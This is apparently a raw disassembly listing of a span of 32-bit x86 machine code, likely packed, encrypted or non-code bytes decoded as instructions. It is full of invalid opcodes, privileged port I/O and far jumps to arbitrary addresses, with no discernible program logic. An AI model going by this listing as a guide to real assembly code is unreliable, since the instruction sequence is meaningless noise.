  4197a7:	mov    ch,0x81
  4197a9:	in     eax,dx
  4197aa:	sub    ch,al
  4197ac:	dec    esi
  4197ad:	push   esi
  4197ae:	lods   eax,DWORD PTR ds:[esi]
  4197af:	frstor [eax]
  4197b1:	fldenv [esi+ebx*8-0xf]
  4197b5:	lahf   
  4197b6:	je     0x419813
  4197b8:	mov    ds:0xdb37bbb1,al
  4197bd:	out    0xa4,eax
  4197bf:	(bad)  
  4197c1:	fidivr DWORD PTR [edx]
  4197c3:	ret    
  4197c4:	lods   al,BYTE PTR ds:[esi]
  4197c5:	into   
  4197c6:	push   es
  4197c7:	mov    ds:0xd349a074,eax
  4197cc:	cmp    al,0x0
  4197ce:	mov    ch,0x2d
  4197d0:	sbb    BYTE PTR es:[eax+ebp*1-0x4bc34a0f],dh
  4197d8:	ss gs adc edx,esi
  4197dc:	xlat   BYTE PTR ds:[ebx]
  4197dd:	mov    ah,0x78
  4197df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197e0:	jbe    0x4197dd
  4197e2:	mov    al,BYTE PTR [eax-0x15]
  4197e5:	js     0x4197dc
  4197e7:	ret    
  4197e8:	dec    esp
  4197e9:	imul   ebx,DWORD PTR [ebp-0x2f],0xffffffd4
  4197ed:	das    
  4197ee:	inc    esi
  4197ef:	xchg   edi,eax
  4197f0:	std    
  4197f1:	hlt    
  4197f2:	sbb    ebx,DWORD PTR [esi-0x3ec69bee]
  4197f8:	dec    ebp
  4197f9:	add    DWORD PTR [edi+0xb5549df],0xc932802
  419803:	inc    ebx
  419804:	ret    
  419805:	not    DWORD PTR [edi+0x6a]
  419808:	push   ss
  419809:	repnz cmp DWORD PTR fs:[eax],eax
  41980d:	test   eax,0x5d945c53
  419812:	jg     0x419877
  419814:	cmc    
  419815:	xor    DWORD PTR ds:[esi-0x38d1395f],ebx
  41981c:	sbb    eax,edx
  41981e:	jmp    0xd4d2:0xc73e3f3e
  419825:	push   ds
  419826:	and    DWORD PTR [ebx+ebx*4],ebx
  419829:	mov    WORD PTR [eax-0x387ff0f1],cs
  41982f:	cmp    BYTE PTR [ebx-0x57],ch
  419832:	imul   BYTE PTR [edx]
  419834:	cmp    eax,0x23df813d
  419839:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41983a:	add    DWORD PTR [ebx-0x4f61db28],0x61dc83bf
  419844:	mov    bl,0x6b
  419846:	lahf   
  419847:	leave  
  419848:	adc    al,bh
  41984a:	(bad)  
  41984b:	int    0xe8
  41984d:	sub    eax,0x6585e1f0
  419852:	jnp    0x419846
  419854:	xchg   eax,edx
  419856:	outs   dx,BYTE PTR ds:[esi]
  419857:	out    0x82,eax
  419859:	jg     0x419858
  41985b:	int3   
  41985c:	push   edx
  41985d:	int3   
  41985e:	lods   eax,DWORD PTR ds:[esi]
  41985f:	lahf   
  419860:	std    
  419861:	out    dx,eax
  419862:	jae    0x41982f
  419864:	mov    ecx,0xa554b666
  419869:	xor    ch,BYTE PTR [esi+0x766f9093]
  41986f:	mov    esi,0xb8fdd961
  419874:	out    dx,eax
  419875:	or     DWORD PTR [edx],edx
  419877:	mov    bl,0x3
  419879:	mov    ?,WORD PTR [edi*2-0x6f448cae]
  419880:	fdiv   DWORD PTR [edx-0x7519abc3]
  419886:	hlt    
  419887:	mov    ?,WORD PTR [ebx-0x50]
  41988a:	in     eax,dx
  41988b:	popf   
  41988c:	pop    ds
  41988d:	jmp    0x4198ea
  41988f:	aaa    
	...
  4198f4:	sbb    BYTE PTR [ecx],0x47
  4198f7:	loope  0x4198d8
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	fstp   st(1)
  419901:	out    0xf9,al
  419903:	push   esp
  419904:	int3   
  419905:	push   cs
  419906:	add    DWORD PTR [eax],eax
  419908:	add    al,0x1
  41990a:	add    BYTE PTR [eax],al
  41990c:	test   eax,0x59e41d3d
  419911:	cmp    BYTE PTR [esi],dl
  419913:	outs   dx,DWORD PTR ds:[esi]
  419914:	xchg   ebp,eax
  419915:	push   edi
  419916:	sbb    al,0xd8
  419918:	mov    ebp,0x23815ca0
  41991d:	mov    ebx,0xc56a72c3
  419922:	aam    0xfb
  419924:	push   cs
  419925:	mov    ebp,0x835d1f4f
  41992a:	aas    
  41992b:	mov    esp,0x1ffa09e4
  419930:	jg     0x41990f
  419932:	add    BYTE PTR [ebx+ebx*8+0x27bb92bb],al
  419939:	dec    esp
  41993a:	dec    ebx
  41993b:	jmp    0xd46e:0x2f1deff6
  419942:	adc    bh,dh
  419944:	into   
  419945:	cmp    DWORD PTR [esi-0x2ed09507],edi
  41994b:	mov    gs,ebp
  41994d:	icebp  
  41994e:	and    ebx,eax
  419950:	add    eax,DWORD PTR [edi+0x6eafa469]
  419956:	rcr    BYTE PTR [ebp+0x28fce512],1
  41995c:	popa   
  41995d:	xchg   esp,eax
  41995e:	sub    al,0x2c
  419960:	cmp    esi,DWORD PTR [ebx]
  419962:	mov    edx,0x5ae10b1d
  419967:	cli    
  419968:	fs retf 0xb4db
  41996c:	mov    DWORD PTR [esi-0x34],ecx
  41996f:	js     0x419995
  419971:	or     DWORD PTR [edi+0x7e],esp
  419974:	mov    BYTE PTR [ebx],ch
  419976:	or     ebp,DWORD PTR [ebx]
  419978:	pushf  
  419979:	mov    dl,0xce
  41997b:	or     al,0xe
  41997d:	fnstenv [ebp+0x6e688535]
  419983:	sbb    esp,DWORD PTR [esi]
  419985:	mov    ds:0x6605136,al
  41998a:	lods   al,BYTE PTR ds:[esi]
  41998b:	sub    BYTE PTR [edx],bl
  41998d:	retf   0x74d
  419990:	cmp    ah,BYTE PTR [esi]
  419992:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419993:	sub    BYTE PTR [eax],ch
  419995:	xor    eax,0x47a8a38e
  41999a:	mov    ds:0x8e0aaccb,al
  41999f:	xlat   BYTE PTR ds:[ebx]
  4199a0:	out    0x4c,al
  4199a2:	gs mov cl,0x55
  4199a5:	cwde   
  4199a6:	aad    0x4
  4199a8:	mov    dh,0x26
  4199aa:	lods   al,BYTE PTR ds:[esi]
  4199ab:	div    BYTE PTR [eax]
  4199ad:	inc    ebp
  4199ae:	fcmovu st,st(1)
  4199b0:	ss jns 0x4199b0
  4199b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199b4:	adc    DWORD PTR [esi-0x4a],esi
  4199b7:	sbb    BYTE PTR [ebp-0x3fd0fe19],bl
  4199bd:	push   ds
  4199be:	stos   DWORD PTR es:[edi],eax
  4199bf:	dec    esi
  4199c0:	adc    bh,BYTE PTR [edi]
  4199c2:	cs in  al,dx
  4199c4:	in     al,0xe
  4199c6:	sbb    esp,esp
  4199c8:	out    dx,al
  4199c9:	inc    edx
  4199ca:	int3   
  4199cb:	das    
  4199cc:	mov    ds:0xa16e3115,eax
  4199d1:	sahf   
  4199d2:	sub    edi,DWORD PTR [edi]
  4199d4:	inc    edi
  4199d5:	inc    eax
  4199d6:	mov    eax,ds:0x6102713e
  4199db:	rcr    BYTE PTR [esi-0x2a],cl
  4199de:	push   ebx
  4199df:	jnp    0x4199a7
  4199e1:	add    eax,0x167ed797
  4199e6:	cmc    
  4199e7:	outs   dx,DWORD PTR ds:[esi]
  4199e8:	or     BYTE PTR [edi-0x541f5de5],dl
  4199ee:	sbb    DWORD PTR [ebp-0x7e8fe8a2],edi
  4199f4:	cmp    bh,bh
  4199f6:	mov    bh,0xb5
  4199f8:	or     esp,DWORD PTR [ebx]
  4199fa:	(bad)  
  4199fb:	(bad)  
  4199fc:	aad    0x40
  4199fe:	shl    DWORD PTR [esi],0xb9
  419a01:	fstp   DWORD PTR [edx-0x2ca55fbc]
  419a07:	push   es
  419a08:	push   cs
  419a09:	in     eax,0xe0
  419a0b:	xchg   cl,al
  419a0d:	mov    ch,0x59
  419a0f:	adc    BYTE PTR [eax],al
	...
  419a71:	add    BYTE PTR [eax],al
  419a73:	add    BYTE PTR [ebx],dh
  419a75:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a7b:	test   ebx,0xa0c215d3
  419a81:	mov    al,ds:0xfd08af4
  419a86:	add    DWORD PTR [eax],eax
  419a88:	add    al,0x1
  419a8a:	add    BYTE PTR [eax],al
  419a8c:	dec    ebx
  419a8d:	sub    edi,0xf5a7863d
  419a93:	test   edx,eax
  419a95:	inc    esi
  419a96:	and    DWORD PTR [eax+0x31],eax
  419a99:	test   BYTE PTR [ecx+0x2e4b88b8],ch
  419a9f:	ja     0x419a3e
  419aa1:	in     al,dx
  419aa2:	cmp    edi,esp
  419aa4:	adc    eax,0x3ef4b410
  419aa9:	inc    esi
  419aaa:	dec    edx
  419aab:	sbb    DWORD PTR [ebx+0x60b7dd1c],esi
  419ab1:	jo     0x419a34
  419ab3:	gs aaa 
  419ab5:	stos   DWORD PTR es:[edi],eax
  419ab6:	mov    ecx,0x80dcd86f
  419abb:	test   al,0x97
  419abd:	mov    bl,0xca
  419abf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ac0:	mov    cl,al
  419ac2:	jmp    0x419a89
  419ac4:	push   esi
  419ac5:	jbe    0x419b0d
  419ac7:	or     eax,0xd854afd8
  419acc:	test   eax,0xc0021db1
  419ad1:	add    al,0x5d
  419ad3:	es mov al,0x34
  419ad6:	in     eax,dx
  419ad7:	retf   0x5a6e
  419ada:	call   0xf10a:0xa9fdf128
  419ae1:	sub    BYTE PTR [edi],0x5b
  419ae4:	repnz outs dx,DWORD PTR ds:[esi]
  419ae6:	cs dec esi
  419ae8:	mov    bl,ah
  419aea:	shr    DWORD PTR [edx],cl
  419aec:	into   
  419aed:	stc    
  419aee:	mov    dh,0x68
  419af0:	das    
  419af1:	stos   DWORD PTR es:[edi],eax
  419af2:	mov    ds:0x771decd3,eax
  419af7:	push   ebp
  419af8:	bound  esi,QWORD PTR [edi]
  419afa:	xchg   DWORD PTR [edi-0x46],edi
  419afd:	stos   DWORD PTR es:[edi],eax
  419afe:	lods   eax,DWORD PTR ds:[esi]
  419aff:	mov    bh,0xfe
  419b01:	xchg   edi,eax
  419b03:	mov    dl,0x8d
  419b05:	aaa    
  419b06:	dec    esp
  419b07:	lahf   
  419b08:	lods   eax,DWORD PTR ds:[esi]
  419b09:	add    al,0x71
  419b0b:	inc    esp
  419b0c:	inc    edi
  419b0d:	mov    ebp,0x8256e95a
  419b12:	idiv   BYTE PTR [esi-0x74]
  419b15:	xor    BYTE PTR [eax-0x3fc054d],0xab
  419b1c:	idiv   DWORD PTR [ebp+0x3a]
  419b1f:	out    0x54,eax
  419b21:	cli    
  419b22:	out    dx,al
  419b23:	xor    al,ch
  419b25:	lods   eax,DWORD PTR ds:[esi]
  419b26:	je     0x419b6b
  419b28:	jno    0x419b10
  419b2a:	fcom   QWORD PTR [ecx+esi*2+0x77]
  419b2e:	out    0xd1,al
  419b30:	sub    eax,0xefa5a42c
  419b35:	fprem  
  419b37:	retf   0xe388
  419b3a:	imul   edx,DWORD PTR [edi],0x11
  419b3d:	cli    
  419b3e:	sbb    al,0xd7
  419b40:	bound  ebp,QWORD PTR [ecx+0x4d24ec5d]
  419b46:	ss push eax
  419b48:	ss das 
  419b4a:	pop    ebx
  419b4b:	xchg   ebp,eax
  419b4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b4d:	push   es
  419b4e:	and    bh,BYTE PTR [ebp+0x48]
  419b51:	lds    edx,FWORD PTR [esi-0x4562b8c5]
  419b57:	sub    BYTE PTR [esi-0x1],al
  419b5a:	out    0x3,al
  419b5c:	ret    0xa622
  419b5f:	inc    esi
  419b60:	xchg   esp,eax
  419b61:	out    dx,eax
  419b62:	add    eax,0xdcb1e99
  419b67:	inc    eax
  419b68:	cmp    esp,DWORD PTR [eax]
  419b6a:	jbe    0x419bdb
  419b6c:	je     0x419be2
  419b6e:	and    al,0x81
  419b70:	push   ebx
  419b71:	mov    eax,0x8170634b
  419b76:	jmp    0x9f11:0x839211ba
  419b7d:	test   edx,eax
  419b7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b80:	dec    ecx
  419b81:	push   ecx
  419b82:	adc    al,BYTE PTR [edx-0x21]
  419b85:	(bad)  
  419b86:	push   ss
  419b87:	jb     0x419c00
  419b89:	arpl   WORD PTR [ecx],cx
  419b8b:	fidiv  WORD PTR ds:[ecx+0x39b4]
	...
  419bf2:	add    BYTE PTR [eax],al
  419bf4:	dec    edx
  419bf5:	(bad)  
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x20
  419c01:	les    edx,FWORD PTR [edi]
  419c03:	aaa    
  419c04:	aam    0x10
  419c06:	add    DWORD PTR [eax],eax
  419c08:	add    al,0x1
  419c0a:	add    BYTE PTR [eax],al
  419c0c:	sbb    dl,BYTE PTR [edx-0x2e]
  419c0f:	pushf  
  419c10:	sbb    bh,cl
  419c12:	fstp   QWORD PTR [edi]
  419c14:	pop    ds
  419c15:	push   0xffffff8d
  419c17:	jmp    FWORD PTR [esi]
  419c19:	dec    ecx
  419c1a:	jnp    0x419c0e
  419c1c:	pop    es
  419c1d:	paddsw mm6,QWORD PTR [eax-0x5b03989d]
  419c24:	sbb    al,0x86
  419c26:	fstp   st(1)
  419c28:	mov    esi,0x8bbe3f5f
  419c2d:	adc    al,0xfa
  419c2f:	and    DWORD PTR [eax-0xb],ebx
  419c32:	aad    0x6d
  419c34:	xor    bl,ch
  419c36:	add    DWORD PTR [edi-0x7c],eax
  419c39:	cdq    
  419c3a:	lea    ebx,[ecx+ecx*2]
  419c3d:	xchg   ebx,eax
  419c3e:	(bad)
  419c41:	pop    edi
  419c42:	test   BYTE PTR es:[ebx+0x41],cl
  419c46:	jno    0x419c67
  419c48:	or     al,0xe6
  419c4a:	arpl   si,sp
  419c4c:	or     BYTE PTR [ebp-0x749d94ec],ch
  419c52:	fadd   DWORD PTR [eax+0x3c]
  419c55:	dec    edx
  419c56:	es xor al,0xf4
  419c59:	ins    DWORD PTR es:[edi],dx
  419c5a:	neg    DWORD PTR [ebp+edi*1+0x8]
  419c5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c5f:	sbb    BYTE PTR [ecx],dh
  419c61:	mov    esi,0xf3dccb66
  419c66:	xor    DWORD PTR [edx-0x39be7ada],esi
  419c6c:	push   0xf81c42c
  419c71:	xchg   esp,eax
  419c72:	pop    ebx
  419c73:	sbb    DWORD PTR [esi-0x6f],ebx
  419c76:	cli    
  419c77:	rcr    BYTE PTR gs:[ecx],0x59
  419c7b:	test   eax,0x1e2a504
  419c80:	xchg   ebp,eax
  419c81:	int    0xb7
  419c83:	shl    BYTE PTR [ebp+esi*4-0x15],1
  419c87:	adc    DWORD PTR [esi-0x4c329691],ebp
  419c8d:	mov    edx,0x93db0aba
  419c92:	dec    edx
  419c93:	dec    ecx
  419c94:	jecxz  0x419c59
  419c96:	xchg   ebp,eax
  419c97:	addr16 jo 0x419c3e
  419c9a:	dec    esp
  419c9b:	bound  esp,QWORD PTR [esi]
  419c9d:	pop    eax
  419c9e:	xchg   ebx,eax
  419c9f:	or     BYTE PTR [edx],bl
  419ca1:	and    ebx,DWORD PTR [ebx]
  419ca3:	push   esi
  419ca4:	cmp    esp,DWORD PTR [esi]
  419ca6:	mov    ebp,0x644e4a98
  419cab:	pop    esp
  419cac:	and    cl,BYTE PTR [eax+0x46]
  419caf:	adc    esi,edi
  419cb1:	inc    esi
  419cb2:	mov    DWORD PTR [ebx+0x7b751303],ebx
  419cb8:	daa    
  419cb9:	xchg   ecx,eax
  419cba:	and    eax,0xa880215c
  419cbf:	in     al,dx
  419cc0:	and    DWORD PTR [esi+eiz*4-0x25],edi
  419cc4:	add    cl,al
  419cc6:	sti    
  419cc7:	pop    esp
  419cc8:	icebp  
  419cc9:	or     DWORD PTR [edx+0x6a],edx
  419ccc:	pop    edx
  419ccd:	xor    dh,dh
  419ccf:	and    ch,cl
  419cd1:	cld    
  419cd2:	xor    BYTE PTR [eax-0x65032cf2],ah
  419cd8:	cli    
  419cd9:	jno    0x419d53
  419cdb:	mov    ecx,0x3235d7a4
  419ce0:	out    dx,al
  419ce1:	repz sbb esi,esi
  419ce4:	arpl   WORD PTR [ecx-0x2230f636],si
  419cea:	pop    esp
  419ceb:	inc    esp
  419cec:	xor    DWORD PTR [ebx+ebp*1+0x5e],esp
  419cf0:	adc    al,0x16
  419cf2:	add    edx,edx
  419cf4:	dec    ebx
  419cf5:	shl    BYTE PTR [edi],1
  419cf7:	adc    esp,DWORD PTR [ebx+0x3180ae18]
  419cfd:	adc    eax,0xdd8d1488
  419d02:	jae    0x419d64
  419d04:	xor    BYTE PTR [edx+0x6675f721],dl
  419d0a:	mov    eax,ds:0xe25ceac
  419d0f:	pushf  
	...
  419d74:	lock xchg edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	fidivr DWORD PTR ss:0xd81b4b27
  419d85:	adc    DWORD PTR [ecx],eax
  419d87:	add    BYTE PTR [ecx+eax*1],al
  419d8a:	add    BYTE PTR [eax],al
  419d8c:	cli    
  419d8d:	xchg   esi,eax
  419d8e:	cmp    DWORD PTR [ecx-0x3b],esi
  419d91:	lods   al,BYTE PTR ds:[esi]
  419d92:	lods   al,BYTE PTR ds:[esi]
  419d93:	int    0x95
  419d95:	ds mov al,dl
  419d98:	cmp    ecx,esi
  419d9a:	mov    ebp,0x24b7e220
  419d9f:	and    DWORD PTR [ebx],ebp
  419da1:	scas   eax,DWORD PTR es:[edi]
  419da2:	in     al,dx
  419da3:	push   bp
  419da5:	fcmovnbe st,st(4)
  419da7:	or     eax,0x77724163
  419dac:	loope  0x419d3c
  419dae:	ins    BYTE PTR es:[edi],dx
  419daf:	adc    eax,0xbb3f6c5b
  419db4:	mov    al,ds:0x3d3d1ab7
  419db9:	push   edi
  419dba:	jb     0x419dee
  419dbc:	and    BYTE PTR [esi+0x47bacdb5],0xe9
  419dc3:	inc    ebp
  419dc4:	jo     0x419e2a
  419dc6:	jl     0x419e42
  419dc8:	out    0xa7,al
  419dca:	hlt    
  419dcb:	sti    
  419dcc:	pop    edi
  419dcd:	and    eax,0xb5bad7c
  419dd2:	neg    BYTE PTR [eax-0x3e]
  419dd5:	mov    DWORD PTR [edx],eax
  419dd7:	test   BYTE PTR [ecx+0x6ddcd3b0],cl
  419ddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dde:	push   ecx
  419ddf:	mov    cs,WORD PTR [ecx-0x6]
  419de2:	push   ebp
  419de3:	rcr    BYTE PTR [esp+eiz*2-0x73],1
  419de7:	stos   DWORD PTR es:[edi],eax
  419de8:	xchg   edx,eax
  419de9:	daa    
  419dea:	mov    dl,ah
  419dec:	cs dec edi
  419dee:	inc    ebp
  419def:	lds    edx,FWORD PTR [edx]
  419df1:	sub    bh,BYTE PTR [esi]
  419df3:	mov    esp,0x49e473f2
  419df8:	dec    edi
  419df9:	popa   
  419dfa:	ret    0x5b5d
  419dfd:	call   0xe4ce5f71
  419e02:	mov    al,bh
  419e04:	xchg   edx,eax
  419e05:	lods   al,BYTE PTR ds:[esi]
  419e06:	adc    ch,dh
  419e08:	inc    edx
  419e09:	xchg   ecx,eax
  419e0a:	cld    
  419e0b:	mov    cs,ebx
  419e0d:	mov    eax,0xbd9ba9e4
  419e12:	push   0x3cb69b66
  419e17:	push   esi
  419e18:	stos   BYTE PTR es:[edi],al
  419e19:	fisttp DWORD PTR ds:0xe633d81d
  419e1f:	mov    ch,0x69
  419e21:	push   0x9
  419e23:	je     0x419ea0
  419e25:	adc    BYTE PTR [ecx+esi*1+0x1a],0x94
  419e2a:	(bad)  
  419e2b:	mov    al,ds:0xfd9c4bc0
  419e30:	outs   dx,BYTE PTR ds:[esi]
  419e31:	aaa    
  419e32:	retf   
  419e33:	inc    ebx
  419e34:	ret    
  419e35:	mov    edx,0xdb050d50
  419e3a:	jl     0x419e91
  419e3c:	loop   0x419e2a
  419e3e:	es stc 
  419e40:	adc    ebp,DWORD PTR [ecx+eax*2]
  419e43:	and    eax,0x7860a456
  419e48:	fisub  WORD PTR [eax+0x5b]
  419e4b:	mov    al,ds:0xf7be197d
  419e50:	imul   edx,DWORD PTR ss:[esi],0x6b
  419e54:	jge    0x419eab
  419e56:	add    BYTE PTR [eax+0x5c],dl
  419e59:	mov    dh,BYTE PTR ds:0xb6ac2860
  419e5f:	push   ss
  419e60:	mov    ebp,0x769132be
  419e65:	jmp    0x98e1:0xb54db936
  419e6c:	cli    
  419e6d:	sbb    DWORD PTR [edx-0x54],ebp
  419e70:	js     0x419e24
  419e72:	adc    esi,DWORD PTR ds:0xd9f2cbfc
  419e78:	mov    BYTE PTR [ebx+0x23],ch
  419e7b:	inc    ecx
  419e7c:	sbb    ebp,DWORD PTR cs:[edx-0x49]
  419e80:	(bad)  
  419e81:	je     0x419eae
  419e83:	dec    eax
  419e84:	fsub   DWORD PTR [eax+0x6f5532f9]
  419e8a:	(bad)  
  419e8b:	xchg   edi,edi
  419e8d:	adc    BYTE PTR [ecx+0x62],ch
	...
  419ef4:	xchg   eax,ebx
  419ef6:	pop    ss
  419ef7:	lds    ebx,FWORD PTR [edi-0x31]
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	lods   al,BYTE PTR ds:[esi]
  419f01:	inc    ebx
  419f02:	xchg   ebx,eax
  419f03:	jnp    0x419ee1
  419f05:	adc    al,BYTE PTR [ecx]
  419f07:	add    BYTE PTR [ecx+eax*1],al
  419f0a:	add    BYTE PTR [eax],al
  419f0c:	jbe    0x419e9f
  419f0e:	sbb    BYTE PTR [edx-0x119639a4],ah
  419f14:	call   0xf85c:0x7fe00df3
  419f1b:	and    eax,0x7447222b
  419f20:	(bad)  
  419f21:	push   edi
  419f22:	in     eax,0x5d
  419f24:	xchg   BYTE PTR [ecx],cl
  419f26:	stos   DWORD PTR es:[edi],eax
  419f27:	sar    dl,1
  419f29:	add    BYTE PTR [eax+edx*8+0x62],cl
  419f2d:	cwde   
  419f2e:	shl    DWORD PTR [edi],0xd5
  419f31:	addr16 pop edi
  419f33:	inc    edi
  419f34:	inc    edi
  419f35:	sub    bl,BYTE PTR [ebx+0x6]
  419f38:	mov    ds,edi
  419f3a:	imul   ebp,DWORD PTR [ecx],0x52
  419f3d:	(bad)  
  419f3f:	add    al,0x0
  419f41:	aam    0x19
  419f43:	mov    esi,0xe105c6bf
  419f48:	les    edx,FWORD PTR [ecx+edx*8-0x55417724]
  419f4f:	sbb    BYTE PTR [ecx+0x10252f87],bl
  419f55:	dec    edi
  419f56:	pop    ebp
  419f57:	fwait
  419f58:	mov    ecx,0xc9f3af0
  419f5d:	out    0x31,al
  419f5f:	add    ch,BYTE PTR ds:0xa5bbce69
  419f65:	sbb    DWORD PTR [eax+0x11f882e3],ebx
  419f6b:	and    BYTE PTR [ebp-0x1d],0x41
  419f6f:	or     ebp,eax
  419f71:	int    0x7d
  419f73:	addr16 cld 
  419f75:	xchg   esi,eax
  419f76:	int    0x12
  419f78:	mov    DWORD PTR [eax+0x6ff6a924],edx
  419f7e:	hlt    
  419f7f:	xor    ebp,esi
  419f81:	mov    al,0x5
  419f83:	add    esp,DWORD PTR [ecx+0x214f5d37]
  419f89:	pop    edx
  419f8a:	std    
  419f8b:	cmovns esi,ebp
  419f8e:	shl    DWORD PTR [eax],0x80
  419f91:	cli    
  419f92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f93:	enter  0x776b,0xe
  419f97:	into   
  419f98:	jae    0x419f48
  419f9a:	fidiv  WORD PTR [eax-0x1]
  419f9d:	and    eax,0x4fbe675d
  419fa2:	pop    ss
  419fa3:	je     0x419f8a
  419fa5:	clc    
  419fa6:	ja     0x419faf
  419fa8:	push   ecx
  419fa9:	adc    cl,BYTE PTR [esi+0x28]
  419fac:	fnsave [edx-0x78]
  419faf:	push   eax
  419fb0:	pop    ds
  419fb1:	adc    al,0xc2
  419fb3:	(bad)  
  419fb5:	(bad)  [ecx]
  419fb7:	push   ds
  419fb8:	popa   
  419fb9:	jbe    0x419f73
  419fbb:	or     ebx,0x1938e413
  419fc1:	jns    0x419fff
  419fc3:	inc    eax
  419fc4:	ret    
  419fc5:	dec    edx
  419fc6:	jl     0x419f4e
  419fc8:	fisttp DWORD PTR [ebx-0x65089392]
  419fce:	cmp    eax,0x65ca5d1c
  419fd3:	push   ebp
  419fd4:	cmp    BYTE PTR [edi+esi*1],ch
  419fd7:	test   al,0xc
  419fd9:	and    eax,DWORD PTR [eax]
  419fdb:	(bad)  
  419fdc:	mov    ah,0xa9
  419fde:	adc    BYTE PTR [eax+0x3f],bl
  419fe1:	and    al,cl
  419fe3:	mov    esi,0x82ffa566
  419fe8:	mov    cl,0x1f
  419fea:	outs   dx,DWORD PTR ds:[esi]
  419feb:	jmp    0xa984:0x5c56e795
  419ff2:	xor    edi,edi
  419ff4:	cmp    ecx,DWORD PTR [edx+0x6a2cc35c]
  419ffa:	pop    ebx
  419ffb:	dec    eax
  419ffc:	push   ds
  419ffd:	xor    DWORD PTR [ecx+0x758b2fb2],0x1a8880a6
  41a007:	dec    ecx
  41a008:	out    0x67,eax
  41a00a:	mov    eax,0x90035b8
  41a00f:	scas   al,BYTE PTR es:[edi]
	...
  41a074:	dec    esi
  41a075:	jmp    0x41a0a1
  41a077:	dec    esi
  41a078:	scas   eax,DWORD PTR es:[edi]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax+0x5c],bh
  41a081:	dec    edi
  41a082:	stc    
  41a083:	xor    al,ah
  41a085:	adc    eax,DWORD PTR [ecx]
  41a087:	add    BYTE PTR [ecx+eax*1],al
  41a08a:	add    BYTE PTR [eax],al
  41a08c:	pop    ebx
  41a08d:	jge    0x41a038
  41a08f:	and    BYTE PTR [eax],al
  41a091:	jns    0x41a079
  41a093:	and    BYTE PTR [esi-0x57],dl
  41a096:	cmp    eax,0x78b0efae
  41a09b:	mov    ecx,edi
  41a09d:	xchg   ecx,eax
  41a09e:	mov    edx,0x3f1c07d0
  41a0a3:	sbb    cl,BYTE PTR [esi+eiz*8-0x75]
  41a0a7:	and    DWORD PTR ds:0xcc3be541,edx
  41a0ad:	aas    
  41a0ae:	test   eax,0x90a625b3
  41a0b3:	sti    
  41a0b4:	ret    0x415b
  41a0b7:	stos   DWORD PTR es:[edi],eax
  41a0b8:	aam    0x80
  41a0ba:	test   al,0xf
  41a0bd:	in     eax,dx
  41a0be:	leave  
  41a0bf:	popf   
  41a0c0:	or     DWORD PTR ds:0x4c6165ee,esi
  41a0c6:	scas   eax,DWORD PTR es:[edi]
  41a0c7:	fidiv  DWORD PTR es:[bp+si+0x558f]
  41a0cd:	sub    edx,DWORD PTR [edi]
  41a0cf:	jle    0x41a091
  41a0d1:	adc    bh,al
  41a0d3:	sub    esp,edi
  41a0d5:	mov    edx,0xe2f1e2e6
  41a0da:	and    WORD PTR [edx-0x68b532da],di
  41a0e1:	stos   DWORD PTR es:[edi],eax
  41a0e2:	ret    0x4169
  41a0e5:	fist   WORD PTR [ecx-0x73f39776]
  41a0eb:	lods   eax,DWORD PTR ds:[esi]
  41a0ec:	cmp    BYTE PTR [ebx+esi*1],0x96
  41a0f0:	push   edx
  41a0f1:	cld    
  41a0f2:	xor    BYTE PTR [esi],dl
  41a0f4:	clc    
  41a0f5:	cdq    
  41a0f6:	call   0x1ed1:0x9727295d
  41a0fd:	sbb    eax,0xab16d6b
  41a102:	in     al,dx
  41a103:	dec    edx
  41a104:	sti    
  41a105:	sbb    al,0xe0
  41a107:	jnp    0x41a109
  41a109:	or     DWORD PTR [eax],ebx
  41a10b:	test   DWORD PTR [edi-0x54a6903c],esp
  41a111:	(bad)  
  41a113:	add    edi,DWORD PTR [ebx+0x7]
  41a116:	sar    DWORD PTR [ebx],1
  41a118:	and    BYTE PTR [bp+di-0x21e4],bh
  41a11d:	and    ah,BYTE PTR [edx+0x70c23321]
  41a123:	outs   dx,DWORD PTR ds:[esi]
  41a124:	pop    ebp
  41a125:	push   ecx
  41a126:	mov    DWORD PTR [eax+edx*1-0x530f1a91],ecx
  41a12d:	fst    QWORD PTR [ebp-0x2dfaea8a]
  41a133:	test   DWORD PTR [ecx+esi*1],edi
  41a136:	mov    dh,0xe7
  41a138:	dec    ebp
  41a139:	mov    dl,0xdf
  41a13b:	test   DWORD PTR [ebx],0x418bf68d
  41a141:	xchg   edi,eax
  41a142:	(bad)  
  41a144:	lds    ecx,FWORD PTR [eax+0x4]
  41a147:	push   esp
  41a148:	(bad)  
  41a149:	neg    BYTE PTR [edx]
  41a14b:	jno    0x41a17d
  41a14d:	in     al,0xea
  41a14f:	pop    ds
  41a150:	push   ss
  41a151:	xchg   ebx,eax
  41a152:	ja     0x41a158
  41a154:	or     esi,DWORD PTR [ebp+0x2c]
  41a157:	inc    esp
  41a158:	icebp  
  41a159:	dec    ebx
  41a15a:	fcomp  DWORD PTR fs:[ebp+0x7789c38e]
  41a161:	inc    ebx
  41a162:	je     0x41a131
  41a164:	cmp    esi,edi
  41a166:	mov    edx,DWORD PTR [eax]
  41a168:	jmp    0xd50482b4
  41a16d:	cwde   
  41a16e:	repnz xor al,0xc3
  41a171:	or     DWORD PTR [ebx+0x63],esp
  41a174:	xor    al,0x91
  41a176:	pop    edi
